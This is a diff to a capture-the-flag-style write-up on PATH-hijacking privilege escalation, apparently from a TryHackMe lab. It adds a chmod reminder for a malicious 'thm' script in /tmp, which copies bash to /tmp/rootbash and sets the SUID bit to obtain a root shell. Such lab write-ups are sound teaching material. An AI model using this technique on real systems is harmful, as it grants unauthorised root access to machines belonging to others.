@@ -98,13 +98,14 @@ This means the system will search for `thm` using the directories listed in the 
 ---
 ## ✍️ Creating the Malicious File
 
-We moved to `/tmp` and created a malicious executable named `thm`.
+We moved to `/tmp` and created a malicious executable named `thm`.We must also grant it execution permissions (`chmod +x`) so the system can run it:
 
 ```bash
 #!/bin/bash
 cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash
 ```
 
+*(Make sure to run `chmod +x /tmp/thm` after creating the file).*
 The `+s` option sets the SUID bit, allowing the binary to run with elevated privileges.
 
 ![img](screenshots/PATH/create_file_chmod.png)
